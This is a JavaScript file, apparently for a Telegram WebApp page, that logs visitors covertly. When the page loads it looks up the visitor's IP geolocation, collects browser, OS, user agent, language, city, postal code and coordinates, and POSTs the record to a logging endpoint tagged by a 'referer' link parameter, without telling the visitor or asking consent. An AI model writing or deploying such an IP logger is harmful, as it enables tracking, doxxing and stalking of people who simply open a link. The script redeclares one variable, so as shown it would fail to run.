function mapToJSON(map) {
  return JSON.stringify(Object.fromEntries(map));
}

const request = async () => { // Calling a "synchronous" fetch
    let tg = window.Telegram.WebApp;
	
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();

    const url = new URL(window.location);
    const referer = url.searchParams.get("referer");

    console.log(referer);

    // Declaring variables
	let time = new Date().toLocaleString('de-DE', { timeZone: 'UTC' });
	let userTime = new Date().toLocaleString('de-DE');

	let event = bowser.getParser(navigator.userAgent);
	let browser = event.parsedResult.browser.name + " " + event.parsedResult.browser.version;
	let os = event.parsedResult.os.name + " " + event.parsedResult.os.version;
	let useragent = navigator.userAgent;
	
    var ip = data.ip;
    var provider = data.org + " (" + data.asn + ")";

    var timezone = data.timezone + " (" + data.utc_offset + ")";
	var language = navigator.language || navigator.userLanguage;
    var country = data.country_name;
    var countryCode = data.country_code;
    var region = data.region + " (" + data.region_code + ")";
    var city = data.city;
	var zip = data.postal;
    var lat = data.latitude;
    var lon = data.longitude;
    
    if(navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
			(position) =>  {
				// accuracy_radius = position.coords.accuracy;
				// lat = position.coords.latitude;
				// lon = position.coords.longitude;
			});
    }

    const map = new Map([
	["time", time],
	["user_time", userTime],
	["browser", browser],
	["os", os],
	["useragent", useragent],
	["ip", ip],
	["provider", provider],
	["timezone", timezone],
	["language", language],
	["country", country],
	["country_code", countryCode],
	["region", region],
	["city", city],
	["zip", zip],
	["latitude", lat],
	["longitude", lon]
    ]);
	
    const log = mapToJSON(map);

    let response = await fetch(`http://127.0.0.1:8080/logs.send/${referer}`, {
        method: 'POST',
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        },
        body: log
    });
	console.log(await response.json());
    
    // tg.sendData(log);
}

request();
